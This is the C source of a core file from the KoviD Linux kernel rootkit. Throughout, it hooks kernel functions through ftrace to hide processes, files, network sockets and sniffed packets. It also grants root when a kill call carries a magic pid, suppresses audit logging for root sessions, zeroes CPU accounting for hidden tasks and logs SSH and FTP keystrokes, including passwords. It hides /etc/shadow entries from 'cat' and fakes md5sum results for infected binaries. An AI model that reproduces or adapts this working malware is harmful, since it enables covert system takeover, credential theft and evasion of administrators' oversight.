/**
 * Linux Kernel version <= 5.8.0
 * - hash
 *
 *  KoviD rootkit
 */

#include <linux/ftrace.h>
#include <linux/fdtable.h>
#include <linux/version.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <uapi/linux/binfmts.h>
#include "lkm.h"
#include "fs.h"
#include "obfstr.h"

#pragma GCC optimize("-fno-optimize-sibling-calls")

#define MAX_DEMO_HOOKS  32

sys64 real_m_exit_group;
sys64 real_m_clone;
sys64 real_m_kill;
sys64 real_m_write;
sys64 real_m_read;
sys64 real_m_execve;

#define PT_REGS_PARM1(x) ((x)->di)
#define PT_REGS_PARM2(x) ((x)->si)
#define PT_REGS_PARM3(x) ((x)->dx)
#define PT_REGS_PARM4(x) ((x)->cx)
#define PT_REGS_PARM5(x) ((x)->r8)
#define PT_REGS_RET(x) ((x)->sp)
#define PT_REGS_FP(x) ((x)->bp)
#define PT_REGS_RC(x) ((x)->ax)
#define PT_REGS_SP(x) ((x)->sp)
#define PT_REGS_IP(x) ((x)->ip)

/**
 * These are kept open throughout kv lifetime
 *  This is so because tty is continuous.
 *  As for md5 there few reasons: it can come
 *  at any time from user interface and opening the file
 *  from that state would require one of the following:
 *      privileges promotion
 *      using a more complex kernel API
 *      input would need to come from root
 *
 *   The file has strict permissions.
 *   It is less complicate to keep the FD open.
 */
static struct file *ttyfilp;
static struct file *md5filp;

static DEFINE_SPINLOCK(tty_lock);
static DEFINE_SPINLOCK(hide_once_spin);

/*
 *  task
 *      |
 *      +--- hidden No -> normal flow
 *      |
 *      +--- hidden Yes
 *              |
 *              +--- Backdoor Yes
 *              |         |
 *              |        +--- unhide all backdoors -> kill all backdoors
 *              +--- Backdoor No
 *                      |
 *                      +--- unhide task
 */
static asmlinkage long m_exit_group(struct pt_regs *regs)
{
    long rc = 0L;
    struct hidden_status status = { .hidden = false, .saddr = 0};

    /** load the status of PID */
    if (!kv_find_hidden_pid(&status, current->pid))
        goto m_exit;

    /** Is backdoor? */
    if (status.saddr) {
        kv_unhide_task_by_pid_exit_group(current->pid);
        goto leave;
    } else {
        /**
         * it is regular hidden PID and needs to
         * be shown prior to exit
         */
        kv_hide_task_by_pid(current->pid, 0, NO_CHILDREN);
    }

m_exit:
    rc = real_m_exit_group(regs);
leave:
    return rc;
}


/**
 * task A (parent of B) <- hidden by hax0r
 *     |
 *     + (clone) --- Task B (child, parent of C) <- hidden by sys_clone if A is hidden
 *               |
 *               + (clone) --- Task C (child) <- hidden by sys_clone if B is hidden
 *
 * See m_exit_group()
 */
static volatile bool hide_once;
static asmlinkage long m_clone(struct pt_regs *regs)
{
    struct hidden_status status = { .saddr = 0 };
    struct task_struct *task = current;

    /** Only proceed if _parent_ IS hidden */
    if (!kv_find_hidden_pid(&status, task->parent->pid))
        goto m_clone;

    /** Only proceed if _child_ ISN'T hidden */
    status.saddr = 0;
    if (!kv_find_hidden_pid(&status, task->pid)) {
        kv_hide_task_by_pid(task->pid,
                status.saddr /* inherit parent's status */, NO_CHILDREN);
    } else if(hide_once && status.saddr){
        /** allow 1 task to be hidden
         * afterwards, but be careful to not
         * spawn other children, can crash */
        kv_reload_hidden_task(task);
        spin_lock(&hide_once_spin);
        hide_once = false;
        spin_unlock(&hide_once_spin);
    }

m_clone:
    return real_m_clone(regs);
}

/**
 * Handle activate/deactivate /proc/kovid
 * Handle privilege escalation
 */
static asmlinkage long m_kill(struct pt_regs *regs)
{
    pid_t pid = (pid_t)PT_REGS_PARM1(regs);
    int sig = (int)PT_REGS_PARM2(regs);

    /** Open/Close commands interface */
    if (31337 == pid && SIGCONT == sig) {
        if (kv_is_proc_interface_loaded())
            kv_remove_proc_interface();
        else
            (void)kv_add_proc_interface();

    /** root */
    } else if (666 == pid && SIGCONT == sig) {
        struct pt_regs rootregs;
        struct kernel_syscalls *kaddr = kv_kall_load_addr();
        struct cred *new = prepare_creds();

        if (!new || !kaddr || !kaddr->k_sys_setreuid)
            goto leave;

        new->uid.val = new->gid.val = 0;
        new->euid.val = new->egid.val = 0;
        new->suid.val = new->sgid.val = 0;
        new->fsuid.val = new->fsgid.val = 0;

        commit_creds(new);
        rootregs.di = 0;
        rootregs.si = 0;
        kaddr->k_sys_setreuid(&rootregs);
        prinfo("Cool! Now try 'su'\n");

    /** The 1 next backdoor task will be hidden */
    } else if (171 == pid && SIGCONT == sig) {
        /** guess am a bit paranoid here... */
        spin_lock(&hide_once_spin);
        hide_once = true;
        spin_unlock(&hide_once_spin);
        prinfo("Cool! Now run your command\n");
    }

leave:
    return real_m_kill(regs);
}

static LIST_HEAD(md5_node);
struct md5_t {
    char original[MD5LEN+1];
    char infected[MD5LEN+1];
    struct list_head list;
};

static char *_md5_find_hash(char *md5) {
    struct md5_t  *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &md5_node, list) {
        if (md5 && !strcmp(md5, node->original))
            return node->infected;
    }
    return NULL;
}

void kv_md5_show_hashes(void) {
    struct md5_t  *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &md5_node, list)
        prinfo("%s %s\n", node->original, node->infected);
}

bool kv_md5_add_hashes(char *infected, char *original, bool w) {
    struct md5_t  *node;
    static loff_t offset;
    if (!original || !infected)
        return false;

    if (_md5_find_hash(original))
        return false;

    node = kcalloc(1, sizeof(struct md5_t), GFP_KERNEL);
    if (!node) {
        prerr("Memory error\n");
        return false;
    }

    memcpy(node->original, original, MD5LEN);
    memcpy(node->infected, infected, MD5LEN);
    list_add_tail(&node->list, &md5_node);

    if (w) {
        size_t total = (MD5LEN*2);
        char buf[total+1];;

        /** write in the log file */
        memset(buf, 0, sizeof(buf));
        total = snprintf(buf, sizeof(buf), "%s%s", original, infected);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
        fs_kernel_write_file(md5filp, (const void*)buf, total, &offset);
#else
        fs_kernel_write_file(md5filp, (const char*)buf, total, offset);
#endif
    }

    return true;
}

static void _md5log_cleanup_list(void) {
    struct md5_t *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &md5_node, list) {
        prinfo("cleaning md5 node\n");
        list_del(&node->list);
        kfree(node);
        node = NULL;
    }
}

/**
 * Will hide a string from files, if command
 * cat is used
 *
 * Use case here is for hiding an entry in /etc/shadow
 * and that's it.
 * Example:
 *
 * $ echo "-f example:\$y\$j9T\$ZAe6Sm4X7K5Trr0yvZFXO.\$hVPrdvJjQBthxljTJegIZlEfX/LRkXHo4rCVp1MaI.1:19097:0:99999:7:::" >/proc/kovid
 *
 * Notice the need to escape $ characters
 */
static asmlinkage long m_read(struct pt_regs *regs) {

    char *buf = NULL, *s;
    const char __user *arg;
    size_t size;
    long rv;
    struct fs_file_node *fs;

    /** call the real thing first */
    rv = real_m_read(regs);

    s = kv_get_hidden_string();
    if (!s)
        goto out;

    fs = fs_get_file_node(current);
    if (!fs || !fs->filename)
        goto out;

    /** Apply only for cat command */
    if (strcmp(fs->filename, "cat") != 0)
        goto out;

    size = PT_REGS_PARM3(regs);
    if (!(buf = (char *)kmalloc(size, GFP_KERNEL)))
        goto out;

    arg = (const char __user*)PT_REGS_PARM2(regs);
    if (!copy_from_user((void *)buf, (void *)arg, size)) {
        char *dest = strstr(buf, s);
        char *src = dest + strlen(s);

        if (dest < src && dest && src) {
            int newrv, n = size - (src - buf);

            /** eat-up the string */
            memmove((void *)dest, (void *)src, n);
            newrv = size - (src - dest);
            if (!copy_to_user((void *)arg, (void *)buf, newrv))
                rv = newrv;
        }
    }

out:
    if (fs) kfree(fs);
    if (buf) kfree(buf);

    return rv;
}

//XXX: handle md5sum -c
static asmlinkage long m_write(struct pt_regs *regs) {
    struct fs_file_node *fs = fs_get_file_node(current);
    const char __user *buf;
    char *obf = "md5sum";
    size_t count = PT_REGS_PARM3(regs);
    char md5[MD5LEN+1] = {0};
    char *fake;

    if (!fs || !fs->filename)
        goto out;

    if (strcmp(fs->filename, obf))
        goto out;

    if (count <= MD5LEN)
        goto out;

    buf = (const char __user*)PT_REGS_PARM2(regs);
    /** Should never happen, here just in case */
    if (!buf)
        goto out;

    if (copy_from_user(md5, buf, MD5LEN))
        goto out;

    md5[strcspn(md5, "\r\n")] = '\0';
    if ((fake = _md5_find_hash(md5)))
        if (copy_to_user((char __user*)buf, fake, MD5LEN))
            prerr("m_write: copy_to_user\n");

out:
    if (fs)
        kfree(fs);
    return real_m_write(regs);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION( 3, 10, 0 )
struct user_arg_ptr {
#ifdef CONFIG_COMPAT
    bool is_compat;
#endif
    union {
        const char __user *const __user *native;
#ifdef CONFIG_COMPAT
        const compat_uptr_t __user *compat;
#endif
    } ptr;
};
#endif


static const char __user *get_user_arg_ptr( struct user_arg_ptr argv, int nr ) {
    const char __user *native;

#ifdef CONFIG_COMPAT
    if ( unlikely( argv.is_compat ) ) {
        compat_uptr_t compat;

        if ( get_user( compat, argv.ptr.compat + nr ) )
            return(ERR_PTR( -EFAULT ) );
        return(compat_ptr( compat ) );
    }
#endif

    if ( get_user( native, argv.ptr.native + nr ) )
        return(ERR_PTR( -EFAULT ) );
    return(native);
}

static asmlinkage long __attribute__((unused))m_execve(struct pt_regs *regs) {
    char exe[128] = {0};
    struct user_arg_ptr argvx = { .ptr.native = PT_REGS_PARM2(regs) };
    const char __user *native = get_user_arg_ptr(argvx, 0);
    if (IS_ERR(native))
        goto real;

    if (copy_from_user(exe, native, sizeof(exe)))
        goto real;
    prinfo("%s\n", exe);

    if (!strcmp(exe, "md5sum")) {
        prinfo("Exe: '%s'\n", exe);
        memset(exe, 0, sizeof(exe));
        native = get_user_arg_ptr(argvx, 1);
        if (IS_ERR(native))
            goto real;

        if (copy_from_user(exe, native, sizeof(exe)))
            goto real;
        prinfo("Arg: '%s'\n", exe);
        if (copy_to_user((char __user*)native, "out", 3))
            prerr("m_execve: copy_to_user\n");
    }

real:
    return real_m_execve(regs);
}

struct tcpudpdata {
    struct seq_file *seq;
    void *v;
};
static bool _find_tcp4udp4_match_cb(struct task_struct *task, void *t) {
    struct tcpudpdata *priv = (struct tcpudpdata*)t;

    if (task && priv) {
        int idx = 0;
        struct fdtable *fdt;
        struct files_struct *files;
        struct sock *s = (struct sock*)priv->v;

        if (!s || !s->sk_socket || !s->sk_socket->file)
            goto not_found;

        files = task->files;

        spin_lock(&files->file_lock);
        for (fdt = files_fdtable(files); idx < fdt->max_fds; ++idx) {
            if (!fdt->fd[idx])
                continue;

            if (s->sk_socket->file->f_inode == fdt->fd[idx]->f_inode) {
                /* found, notify */
                spin_unlock(&files->file_lock);
                goto found;
            }
        }
        spin_unlock(&files->file_lock);
    }
not_found:
    return false;
found:
    return true;
}

static int (*real_m_tcp4_seq_show)(struct seq_file *seq, void *v);
static int m_tcp4_seq_show(struct seq_file *seq, void *v) {

    if (v != SEQ_START_TOKEN) {
        struct tcpudpdata t = { .seq = seq, .v = v };
        if (kv_for_each_hidden_backdoor_task(_find_tcp4udp4_match_cb, (void*)&t)) {
            prinfo("Got tcp4 task from callback\n");
            return 0;
        }
    }

    return real_m_tcp4_seq_show(seq, v);
}

static int (*real_m_udp4_seq_show)(struct seq_file *seq, void *v);
static int m_udp4_seq_show(struct seq_file *seq, void *v) {

    if (v != SEQ_START_TOKEN) {
        struct tcpudpdata t = { .seq = seq, .v = v };
        if (kv_for_each_hidden_backdoor_task(_find_tcp4udp4_match_cb, (void*)&t)) {
            prinfo("Got udp4 task from callback\n");
            return 0;
        }
    }

    return real_m_tcp4_seq_show(seq, v);
}

#pragma message "tcp6_seq_show untested"
static int (*real_m_tcp6_seq_show)(struct seq_file *seq, void *v);
static int m_tcp6_seq_show(struct seq_file *seq, void *v) {

    if (v != SEQ_START_TOKEN) {
        struct tcpudpdata t = { .seq = seq, .v = v };
        if (kv_for_each_hidden_backdoor_task(_find_tcp4udp4_match_cb, (void*)&t)) {
            prinfo("Got tcp6 task from callback\n");
            return 0;
        }
    }

    return real_m_tcp6_seq_show(seq, v);
}

#pragma message "udp6_seq_show untested"
static int (*real_m_udp6_seq_show)(struct seq_file *seq, void *v);
static int m_udp6_seq_show(struct seq_file *seq, void *v) {

    if (v != SEQ_START_TOKEN) {
        struct tcpudpdata t = { .seq = seq, .v = v };
        if (kv_for_each_hidden_backdoor_task(_find_tcp4udp4_match_cb, (void*)&t)) {
            prinfo("Got udp6 task from callback\n");
            return 0;
        }
    }

    return real_m_tcp6_seq_show(seq, v);
}

static bool _find_packet_rcv_iph_match_cb(__be32 addr, void *t) {
    struct sk_buff *skb = (struct sk_buff*)t;
    struct iphdr *iph = (struct iphdr*)skb_network_header(skb);

    if (iph->saddr == addr || iph->daddr == addr) {
        return true;
    }
    return false;
}

/**
 * packet sniffers
 */
static int (*real_packet_rcv)(struct sk_buff *, struct net_device *,
        struct packet_type *, struct net_device *);
static int m_packet_rcv(struct sk_buff *skb, struct net_device *dev,
        struct packet_type *pt, struct net_device *orig_dev) {

    if (skb->protocol == htons(ETH_P_IP)) {
        struct iphdr *iph = (struct iphdr*)skb_network_header(skb);
        if (kv_for_each_hidden_backdoor_data(_find_packet_rcv_iph_match_cb, skb))
            return 0;
        else if (kv_bd_search_iph(iph->saddr))
            return 0;
        else {
            struct tcphdr *tcp = (struct tcphdr*)skb_transport_header(skb);
            if (kv_check_cursing(tcp))
                return 0;
        }
    }

    return real_packet_rcv(skb, dev, pt, orig_dev);
}

static int (*real_tpacket_rcv)(struct sk_buff *, struct net_device *,
        struct packet_type *, struct net_device *);
static int m_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
        struct packet_type *pt, struct net_device *orig_dev) {

    if (skb->protocol == htons(ETH_P_IP)) {
        struct iphdr *iph = (struct iphdr*)skb_network_header(skb);
        if (kv_for_each_hidden_backdoor_data(_find_packet_rcv_iph_match_cb, skb))
            return 0;
        else if (kv_bd_search_iph(iph->saddr))
            return 0;
        else {
            struct tcphdr *tcp = (struct tcphdr*)skb_transport_header(skb);
            if (kv_check_cursing(tcp))
                return 0;
        }
    }

    return real_tpacket_rcv(skb, dev, pt, orig_dev);
}

/**
 * Hide CPU usage of any hidden task
 * This is as simple as it looks: simply don't count ticks
 * if they are coming from hidden tasks
 */
static void (*real_account_process_tick)(struct task_struct *, int);
static void m_account_process_tick(struct task_struct *p, int user_tick) {
    bool found = kv_find_hidden_task(p);
    real_account_process_tick(p, found ? 0 : user_tick);
}

/**
 * And do the same here for cputime
 */
static void (*real_account_system_time)(struct task_struct *, int, u64);
static void m_account_system_time(struct task_struct *p, int hardirq_offset, u64 cputime) {
    bool found = kv_find_hidden_task(p);
    real_account_system_time(p, hardirq_offset, found ? 0 : cputime);
}


static struct audit_buffer * (*real_audit_log_start)(struct audit_context *, gfp_t, int);
static struct audit_buffer *m_audit_log_start(struct audit_context *ctx,
        gfp_t gfp_mask, int type) {

    const struct cred *c = current->real_cred;
    /**
     *  We'll trigger this KauditD log when executing
     *  certain operations after privilege escalation.
     *  Legit root may not actually trigger this path
     *
     *  Return NULL should be enough to avoid logs, at least
     *  in most cases. Fingers crossed.
     */
    if (!c->uid.val && !c->gid.val && !c->suid.val &&
            !c->sgid.val && !c->euid.val && !c->egid.val &&
            !c->fsuid.val && !c->fsgid.val) {
        return NULL;
    }
    return real_audit_log_start(ctx, gfp_mask, type);
}

static int  (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
static int m_filldir(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {

    if (fs_search_name(name))
        return 0;
    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}

static int  (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {

    if (fs_search_name(name))
        return 0;
    return real_filldir64(ctx, name, namlen, offset, ino, d_type);
}

#define MAXKEY 512
static LIST_HEAD(keylog_node);
struct keylog_t {
    char buf[MAXKEY+2]; /** newline+'\0' */
    int offset;
    uid_t uid;
    struct list_head list;
};

static void __attribute__((unused))
_tty_dump(uid_t uid, pid_t pid, char *buf, ssize_t len) {
    prinfo("%s\n", buf);
}

enum { R_NONE, R_RETURN, R_NEWLINE=2, R_RANGE=4 };
static void _tty_write_log(uid_t uid, pid_t pid, char *buf, ssize_t len) {
    static loff_t offset;
    size_t total;

    /* rebel without a cause */
    char fuck_this_iso_c90_again[len+16]; /** more than enough */

    spin_lock(&tty_lock);
    total = snprintf(fuck_this_iso_c90_again,
            sizeof(fuck_this_iso_c90_again), "uid.%d %s", uid, buf);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
    fs_kernel_write_file(ttyfilp, (const void*)fuck_this_iso_c90_again, total, &offset);
#else
    fs_kernel_write_file(ttyfilp, (const char*)fuck_this_iso_c90_again, total, offset);
#endif
    spin_unlock(&tty_lock);
}

static int inline _key_add(uid_t uid, char byte, int flags) {
    struct keylog_t *kl;
    int rv = 0;

    if ((flags & R_RETURN) || (!(flags & R_RANGE)))
        return rv;

    kl = kcalloc(1, sizeof(struct keylog_t) , GFP_KERNEL);
    if (!kl) {
        prerr("Insufficient memory\n");
        rv = -ENOMEM;
    } else {
        kl->offset = 0;
        kl->buf[kl->offset++] = byte;
        kl->uid = uid;
        list_add_tail(&kl->list, &keylog_node);
    }

    return rv;
}

static int _key_update(uid_t uid, char byte, int flags) {
    struct keylog_t  *node, *node_safe;
    bool new = true;
    int rv = 0;

    list_for_each_entry_safe(node, node_safe, &keylog_node, list) {
        if (node->uid != uid) continue;

        if (flags & R_RETURN) {
            node->buf[node->offset++] = '\n';
            node->buf[node->offset] = 0;

            _tty_write_log(uid, 0, node->buf,
                    strlen(node->buf));

            list_del(&node->list);
            kfree(node);
        } else if((flags & R_RANGE) || (flags & R_NEWLINE)) {
            if (node->offset < MAXKEY) {
                node->buf[node->offset++] = byte;
            }
            else {
                prwarn("Warning: max length reached: %d\n", MAXKEY);
                return -ENOMEM;
            }
        }
        new = false;
        break;
    }

    if (new)
        rv = _key_add(uid, byte, flags);

    return rv;
}

static void _keylog_cleanup_list(void) {
    /**
    * it is unlikely we've left anything
    * behind, even so...
    */
    struct keylog_t *node, *node_safe;
    list_for_each_entry_safe(node, node_safe, &keylog_node, list) {
        list_del(&node->list);
        kfree(node);
        node = NULL;
    }
}

static bool _rm_tty_log;
void kv_keylog_rm_log(bool rm_log) {
    _rm_tty_log = rm_log;
}

static void _keylog_close_file(void) {
    fs_kernel_close_file(ttyfilp);
    ttyfilp = NULL;
}

void _keylog_cleanup(void) {
    _keylog_cleanup_list();
    _keylog_close_file();

    if (_rm_tty_log && fs_file_rm(TTYFILE))
        prerr("Error removing %s\n", TTYFILE);
}

static bool _rm_md5_log;
void kv_md5log_rm_log(bool rm_log) {
    _rm_md5_log = rm_log;
}

static void _md5log_cleanup(void) {
    struct kstat stat;

    _md5log_cleanup_list();
    fs_kernel_close_file(md5filp);
    md5filp = NULL;

    /** The is created when kv is loaded
     * If it is empty it will be removed when
     * rmmod comes
     */
    if (fs_file_stat(MD5FILE, &stat) == 0) {
        if (!stat.size)
            kv_md5log_rm_log(true);
    }

    if (_rm_md5_log && fs_file_rm(MD5FILE))
        prerr("Error removing %s\n", MD5FILE);
}

static ssize_t  (*real_tty_read)(struct file *, char __user *, size_t, loff_t *);
static ssize_t __attribute__((unused))
    m_tty_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) {

    enum { APP_SSH = 1, APP_FTP };
    struct fs_file_node *fs = NULL;
    char byte;
    int flags = R_NONE;
    int app_flag = 0;
    ssize_t rv;
    char *ttybuf = NULL;
    uid_t uid;

    //struct tty_struct *tty =
    //  ((struct tty_file_private *)file->private_data)->tty;

    rv = real_tty_read(file, buf, count, ppos);
    if (rv <= 0)
        goto out;

    fs = fs_get_file_node(current);
    if (!fs) goto out;

    if (!strncmp(fs->filename, "ssh", 3))
        app_flag |= APP_SSH;
    else if (!strncmp(fs->filename, "netkit", 6))
        app_flag |= APP_FTP;

    if (!app_flag)
        goto out;

    ttybuf = kzalloc(rv+2, GFP_KERNEL);
    if (!ttybuf)
        goto out;

    if (copy_from_user(ttybuf, buf, rv))
        goto out;

    byte = ttybuf[0];
    uid = current->cred->uid.val;

    flags |= (byte >= 32 && byte < 127) ? R_RANGE : flags;
    flags |= (byte == '\r') ? R_RETURN : flags;
    flags |= (byte == '\n') ? R_NEWLINE : flags;

    /**
     * this is hacky but ssh session data
     * comes bit a bit, while ftp same, however
     * it can also come in as a batch, for example, when a password
     * is entered it is buffered internally and sent as a whole at once
     */
    if ((app_flag & APP_FTP) && rv > 1) {
        ttybuf[strcspn(ttybuf, "\r")] = '\0';
        _tty_write_log(uid, 0, ttybuf,
                sizeof(ttybuf));

    } else if (app_flag & APP_SSH &&
            (rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
        _key_update(uid, byte, flags);
    }

out:
    if (ttybuf)
        kfree(ttybuf);

    if (fs)
        kfree(fs);
    return rv;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define ftrace_regs pt_regs

static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs)
{
    return fregs;
}
#endif

/**
 * It's not always that prefix __x64_ is included in
 * syscall names under 64 bits Linux
 */
static unsigned long  _load_syscall_variant(struct kernel_syscalls *ks,
        const char *str) {
    unsigned long rv;
    if (!ks || !ks->k_kallsyms_lookup_name) {
        prerr("unresolved: kallsyms_lookup_name\n");
        return 0L;
    }

    if (!str) {
        prerr("invalid argument\n");
        return 0L;
    }

    if (!(rv = ks->k_kallsyms_lookup_name(str))) {
        /** there is no actual limit for syscall
         * name length, AFAIK, but hey! 64 bytes must fit FFS!
         */
        char tmp[64+1] = {0};

        snprintf(tmp, 64, "__x64_%s", str);
        rv = ks->k_kallsyms_lookup_name(tmp);
    }

    return rv;
}

struct ftrace_hook {
    /** Must not change declaration
     * ordering for the following members.
     * @See ft_hooks
     */
    const char *name;
    void *function;
    void *original;

    /** Syscall will incur in extra checks */
    bool syscall;

    unsigned long address;
    struct ftrace_ops ops;
};

static int fh_resolve_hook_address(struct ftrace_hook *hook) {
    struct kernel_syscalls *ksp = kv_kall_load_addr();
    if (!ksp || !ksp->k_kallsyms_lookup_name) {
        prerr("unresolved: kallsyms_lookup_name\n");
        return -ENOENT;
    }

    if (!hook->syscall)
        hook->address = ksp->k_kallsyms_lookup_name(hook->name);
    else
        hook->address = _load_syscall_variant(ksp, hook->name);

    if (!hook->address) {
        prerr("unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

    *((unsigned long*) hook->original) = hook->address;

    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
        struct ftrace_ops *ops, struct ftrace_regs *fregs) {
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}

struct kernel_syscalls *kv_kall_load_addr(void) {
    static struct kernel_syscalls ks;

    if (!ks.k_kallsyms_lookup_name) {
        static struct kprobe kps;

        kps.symbol_name = "kallsyms_lookup_name";
        register_kprobe(&kps);
        ks.k_kallsyms_lookup_name = (kallsyms_lookup_name_sg)kps.addr;
        unregister_kprobe(&kps);
        prinfo("kv: using kprobe for kallsyms_lookup_name\n");

        ks.k_attach_pid     = (attach_pid_sg)ks.k_kallsyms_lookup_name("attach_pid");
        if (!ks.k_attach_pid)
            prwarn("invalid data: attach_pid will not work\n");

        ks.k_sys_setreuid   = (sys64)_load_syscall_variant(&ks, "sys_setreuid");;
        if (!ks.k_sys_setreuid)
            prwarn("invalid data: syscall hook setreuid will not work\n");
    }
    return &ks;
}

static struct ftrace_hook ft_hooks[] = {
    {"sys_exit_group", m_exit_group, &real_m_exit_group, true},
    {"sys_clone", m_clone, &real_m_clone, true},
    {"sys_kill", m_kill, &real_m_kill, true},
    {"sys_write", m_write, &real_m_write, true},
    {"sys_read", m_read, &real_m_read, true},
    {"tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show},
    {"udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show},
    {"tcp6_seq_show", m_tcp6_seq_show, &real_m_tcp6_seq_show},
    {"udp6_seq_show", m_udp6_seq_show, &real_m_udp6_seq_show},
    {"packet_rcv", m_packet_rcv, &real_packet_rcv},
    {"tpacket_rcv", m_tpacket_rcv, &real_tpacket_rcv},
    {"account_process_tick", m_account_process_tick, &real_account_process_tick},
    {"account_system_time", m_account_system_time, &real_account_system_time},
    {"audit_log_start", m_audit_log_start, &real_audit_log_start},
    {"filldir", m_filldir, &real_filldir},
    {"filldir64", m_filldir64, &real_filldir64},
#if LINUX_VERSION_CODE < KERNEL_VERSION(5,10,0) /** copy_from_user/access_ok Fails */
    {"tty_read", m_tty_read, &real_tty_read},
#endif
    {NULL, NULL, NULL},
};

int fh_install_hook(struct ftrace_hook *hook) {
    int err;

    if ((err = fh_resolve_hook_address(hook)))
        return err;

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS|FTRACE_OPS_FL_RECURSION|FTRACE_OPS_FL_IPMODIFY;

    if ((err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0))) {
        prerr("ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    if ((err = register_ftrace_function(&hook->ops))) {
        prerr("register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook) {
    int err;
    if ((err = unregister_ftrace_function(&hook->ops)))
        pr_debug("unregister_ftrace_function() failed: %d\n", err);

    if ((err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0)))
        pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
}

int fh_install_hooks(struct ftrace_hook *hooks) {
    int rc = 0;
    size_t i = 0;

    for (; hooks[i].name != NULL; i++) {
        prinfo("Installing: '%s' syscall=%d\n", hooks[i].name, hooks[i].syscall);
        if ((rc = fh_install_hook(&hooks[i])))
            goto unroll;
    }
    goto leave;
unroll:
    while (i >= 0) {
        fh_remove_hook(&hooks[--i]);
    }
leave:
    return rc;
}

void fh_remove_hooks(struct ftrace_hook *hooks) {
    size_t i = 0;
    for (; hooks[i].name != NULL; i++) {
        fh_remove_hook(&hooks[i]);
    }
}

static bool _validate_md5(char *buf, ssize_t size, bool ok) {
    if (!ok) {
        prinfo("md5 file not OK\n");
        return false;
    }

    if (size < MD5PAIRLEN) {
        prinfo("empty md5 file\n");
        return false;
    }

    if (size % MD5PAIRLEN) {
        prerr("corrupted md5 file\n");
        return false;
    }

    if (!kv_whatever_is_md5(buf, size)) {
        prerr("unexpected md5 file content(s)\n");
        return false;
    }

    return true;
}

bool sys_init(void) {
    struct kstat stat;
    int idx = 0, rc;

    /** Init tty log and md5 */
    ttyfilp = fs_kernel_open_file(TTYFILE);
    if (!ttyfilp) {
        return false;
    }

    md5filp = fs_kernel_open_file(MD5FILE);
    if (!md5filp) {
        _keylog_close_file();
        return false;
    }

    /** if md5 file is present load it into the list */
    if (fs_file_stat(MD5FILE, &stat) == 0) {
        char buf[stat.size+1];
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
        loff_t offset = 0;
        ssize_t rv;
#else
        unsigned long offset = 0;
        int rv;
#endif

        memset(buf, 0, sizeof(buf));
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
        rv = fs_kernel_read_file(md5filp, (void*)buf, stat.size, &offset);
#else
        rv = fs_kernel_read_file(md5filp, offset, buf, stat.size);
#endif
        if (_validate_md5(buf, rv, (rv == stat.size))) {
            while (rv > 0) {
                char fake[MD5LEN+1] = {0};
                char orig[MD5LEN+1] = {0};

                memcpy(orig, &buf[idx], MD5LEN);
                memcpy(fake, &buf[idx+MD5LEN], MD5LEN);

                kv_md5_add_hashes(fake, orig, false);

                idx += MD5PAIRLEN;
                rv -= MD5PAIRLEN;
            }
        }
    }

    /** init hooks - negate so we're consistent with other inits */
    rc = !fh_install_hooks(ft_hooks);
    if (rc) {
        for (idx = 0; ft_hooks[idx].name != NULL; ++idx)
            prinfo("ftrace hook %d on %s\n", idx, ft_hooks[idx].name);
    }
    return rc;
}

void sys_deinit(void) {
    fh_remove_hooks(ft_hooks);
    _keylog_cleanup();
    _md5log_cleanup();
}
